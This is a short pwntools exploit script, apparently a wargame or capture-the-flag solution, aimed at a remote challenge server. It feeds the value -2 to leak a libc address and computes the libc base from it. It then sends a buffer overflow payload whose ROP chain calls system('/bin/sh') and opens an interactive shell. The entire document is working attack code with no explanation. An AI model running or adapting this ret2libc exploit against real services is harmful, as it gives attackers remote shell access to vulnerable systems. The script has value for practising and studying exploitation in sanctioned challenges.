from pwn import *

context.log_level = "debug"
context.arch = "amd64"

#p = process("./prob")
p = remote("war.sschall.xyz", 20001)
e = ELF("./prob")
libc = ELF("./libc.so.6")

p.sendlineafter(b'\n', b'-2')

p.recvuntil(b': ')
libc_leak = int(p.recvuntil(b'\n')[:-1], 16)
libc_base = libc_leak - libc.sym["_IO_2_1_stdin_"]
log.info(f"libc base : {hex(libc_base)}")

p_rdi = libc_base + 0x000000000002a3e5 # pop rdi; ret;
binsh = libc_base + next(libc.search(b'/bin/sh'))
ret = libc_base + 0x2a3e6 # ret;
system = libc_base + libc.sym["system"]

payload = b''
payload += b'A' * 48
payload += b'B' * 8
payload += p64(p_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
p.sendafter(b'> ', payload)

p.interactive()
